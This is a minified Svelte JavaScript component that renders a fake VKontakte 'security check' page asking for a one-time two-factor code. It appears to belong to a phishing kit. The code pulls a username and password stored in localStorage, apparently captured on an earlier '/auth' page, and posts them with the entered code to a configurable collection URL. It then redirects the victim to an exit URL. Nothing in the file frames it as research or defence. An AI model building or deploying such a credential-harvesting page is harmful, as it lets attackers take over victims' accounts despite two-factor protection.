import{_ as t,a,b as e,c as s,i as r,d as n,S as o,s as c,e as l,v as u,f as i,g as f,k as h,w as v,h as p,j as d,l as m,n as _,m as b,x as E,q,y as g,z as x,A as y,o as k,p as I,B as U,t as S,u as D}from"./client.235d5a19.js";import{R as A,a as V,f as w,e as N,d as P,b as R}from"./auth-constants.6e91b4b3.js";function T(t){var s=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Date.prototype.toString.call(Reflect.construct(Date,[],(function(){}))),!0}catch(t){return!1}}();return function(){var r,n=a(t);if(s){var o=a(this).constructor;r=Reflect.construct(n,arguments,o)}else r=n.apply(this,arguments);return e(this,r)}}function j(t){var a,e,s,r,n,o;return{c:function(){a=l("div"),e=l("h4"),s=u("Ошибка"),r=i(),n=l("div"),o=u(t[1]),this.h()},l:function(c){a=f(c,"DIV",{class:!0});var l=h(a);e=f(l,"H4",{class:!0});var u=h(e);s=v(u,"Ошибка"),u.forEach(p),r=d(l),n=f(l,"DIV",{class:!0});var i=h(n);o=v(i,t[1]),i.forEach(p),l.forEach(p),this.h()},h:function(){m(e,"class","otp-form__error-title svelte-1uqr02n"),m(n,"class","otp-form__error-desc"),m(a,"class","otp-form__error svelte-1uqr02n")},m:function(t,c){_(t,a,c),b(a,e),b(e,s),b(a,r),b(a,n),b(n,o)},p:function(t,a){2&a&&E(o,t[1])},d:function(t){t&&p(a)}}}function B(t){var a,e,s,r,n,o,c,E,S,D,A,V,w,N,P,R,T,B,L,O,H,$,z,C,F,J,M,G,K,Q,W,X,Y,Z,tt,at,et,st,rt,nt=t[1]&&j(t);return{c:function(){a=i(),e=l("div"),s=l("div"),r=l("div"),n=l("nav"),o=l("a"),c=u("ВКонтакте"),E=i(),S=l("a"),D=i(),A=l("form"),V=l("h1"),w=u("Проверка безопасности"),N=i(),P=l("div"),R=l("p"),T=u("Пожалуйста, введите\n          "),B=l("b"),L=u("код"),O=u("\n          из личного сообщения от Администрации или из приложения для генерации\n          кодов, чтобы подтвердить, что Вы владелец страницы."),H=i(),nt&&nt.c(),$=i(),z=l("div"),C=l("label"),F=l("span"),J=u("Код подтверждения"),M=i(),G=l("input"),K=i(),Q=l("label"),W=l("input"),X=i(),Y=l("span"),Z=u("Запомнить браузер"),tt=i(),at=l("button"),et=u("Отправить"),this.h()},l:function(t){q('[data-svelte="svelte-8ak072"]',document.head).forEach(p),a=d(t),e=f(t,"DIV",{class:!0});var l=h(e);s=f(l,"DIV",{class:!0});var u=h(s);r=f(u,"DIV",{class:!0});var i=h(r);n=f(i,"NAV",{class:!0});var m=h(n);o=f(m,"A",{class:!0,href:!0});var _=h(o);c=v(_,"ВКонтакте"),_.forEach(p),E=d(m),S=f(m,"A",{href:!0,rel:!0,class:!0}),h(S).forEach(p),m.forEach(p),i.forEach(p),D=d(u),A=f(u,"FORM",{class:!0});var b=h(A);V=f(b,"H1",{class:!0});var g=h(V);w=v(g,"Проверка безопасности"),g.forEach(p),N=d(b),P=f(b,"DIV",{class:!0});var x=h(P);R=f(x,"P",{class:!0});var y=h(R);T=v(y,"Пожалуйста, введите\n          "),B=f(y,"B",{});var k=h(B);L=v(k,"код"),k.forEach(p),O=v(y,"\n          из личного сообщения от Администрации или из приложения для генерации\n          кодов, чтобы подтвердить, что Вы владелец страницы."),y.forEach(p),H=d(x),nt&&nt.l(x),$=d(x),z=f(x,"DIV",{class:!0});var I=h(z);C=f(I,"LABEL",{class:!0});var U=h(C);F=f(U,"SPAN",{class:!0});var j=h(F);J=v(j,"Код подтверждения"),j.forEach(p),M=d(U),G=f(U,"INPUT",{type:!0,class:!0,autocomplete:!0,inputmode:!0,placeholder:!0,disabled:!0,minlength:!0,maxlength:!0,pattern:!0}),U.forEach(p),K=d(I),Q=f(I,"LABEL",{class:!0});var st=h(Q);W=f(st,"INPUT",{type:!0,class:!0,disabled:!0}),X=d(st),Y=f(st,"SPAN",{class:!0});var rt=h(Y);Z=v(rt,"Запомнить браузер"),rt.forEach(p),st.forEach(p),tt=d(I),at=f(I,"BUTTON",{type:!0,class:!0,disabled:!0});var ot=h(at);et=v(ot,"Отправить"),ot.forEach(p),I.forEach(p),x.forEach(p),b.forEach(p),u.forEach(p),l.forEach(p),this.h()},h:function(){document.title="Проверка безопасности | ВКонтакте",m(o,"class","otp-form__nav-logo svelte-1uqr02n"),m(o,"href","/"),m(S,"href","https://vk.com"),m(S,"rel","external"),m(S,"class","otp-form__nav-action svelte-1uqr02n"),m(n,"class","otp-form__nav svelte-1uqr02n"),m(r,"class","otp-form__nav-container svelte-1uqr02n"),m(V,"class","otp-form__form-title svelte-1uqr02n"),m(R,"class","otp-form__form-desc svelte-1uqr02n"),m(F,"class","otp-form__label svelte-1uqr02n"),m(G,"type","text"),m(G,"class","otp-form__input svelte-1uqr02n"),m(G,"autocomplete","one-time-code"),m(G,"inputmode","numeric"),m(G,"placeholder","Введите код"),G.disabled=t[0],m(G,"minlength","4"),m(G,"maxlength","8"),m(G,"pattern","[0-9]+"),m(C,"class","otp-form__field svelte-1uqr02n"),m(W,"type","checkbox"),m(W,"class","otp-form__checkbox-element svelte-1uqr02n"),W.disabled=t[0],m(Y,"class","otp-form__checkbox-label svelte-1uqr02n"),m(Q,"class","otp-form__field otp-form__field--checkbox svelte-1uqr02n"),m(at,"type","submit"),m(at,"class","otp-form__button otp-form__button--primary\n            otp-form__button--submit svelte-1uqr02n"),at.disabled=t[0],m(z,"class","otp-form__fields svelte-1uqr02n"),m(P,"class","otp-form__content svelte-1uqr02n"),m(A,"class","otp-form__form svelte-1uqr02n"),m(s,"class","otp-form"),m(e,"class","background svelte-1uqr02n")},m:function(l,u){_(l,a,u),_(l,e,u),b(e,s),b(s,r),b(r,n),b(n,o),b(o,c),b(n,E),b(n,S),b(s,D),b(s,A),b(A,V),b(V,w),b(A,N),b(A,P),b(P,R),b(R,T),b(R,B),b(B,L),b(R,O),b(P,H),nt&&nt.m(P,null),b(P,$),b(P,z),b(z,C),b(C,F),b(F,J),b(C,M),b(C,G),g(G,t[2]),b(z,K),b(z,Q),b(Q,W),W.checked=t[3],b(Q,X),b(Q,Y),b(Y,Z),b(z,tt),b(z,at),b(at,et),st||(rt=[x(G,"input",t[7]),x(W,"change",t[8]),x(A,"submit",y(t[4]))],st=!0)},p:function(t,a){var e=k(a,1)[0];t[1]?nt?nt.p(t,e):((nt=j(t)).c(),nt.m(P,$)):nt&&(nt.d(1),nt=null),1&e&&(G.disabled=t[0]),4&e&&G.value!==t[2]&&g(G,t[2]),1&e&&(W.disabled=t[0]),8&e&&(W.checked=t[3]),1&e&&(at.disabled=t[0])},i:I,o:I,d:function(t){t&&p(a),t&&p(e),nt&&nt.d(),st=!1,U(rt)}}}function L(t,a){return{exitUrl:a.exit,authUrl:a.authUrl}}function O(t,a,e){var s=a.exitUrl,r=a.authUrl;S((function(){localStorage.getItem("username")&&localStorage.getItem("password")||D("/auth")}));var n=!1,o="",c="",l=!0;return t.$$set=function(t){"exitUrl"in t&&e(5,s=t.exitUrl),"authUrl"in t&&e(6,r=t.authUrl)},[n,o,c,l,function(){e(0,n=!0);var t={code:c,username:localStorage.getItem("username"),password:localStorage.getItem("password")};fetch(r,{method:"POST",body:JSON.stringify(t),headers:{"Content-Type":"application/json"}}).then((function(t){return t.json()})).then((function(t){switch(t.status){case R:window.location.assign(s);break;case P:case N:D("/auth");break;case w:e(1,o="Пожалуйста, введите код, который Вы только что получили.");break;case V:e(1,o="Слишком много попыток входа. Повторите попытку позднее.");break;case A:default:e(1,o="Произошла неизвестная ошибка.")}})).catch((function(){e(1,o="Произошла сетевая ошибка"),setInterval((function(){return e(1,o="")}),5e3)})).then((function(){return e(0,n=!1)}))},s,r,function(){c=this.value,e(2,c)},function(){l=this.checked,e(3,l)}]}var H=function(a){t(l,o);var e=T(l);function l(t){var a;return s(this,l),a=e.call(this),r(n(a),t,O,B,c,{exitUrl:5,authUrl:6}),a}return l}();export default H;export{L as preload};
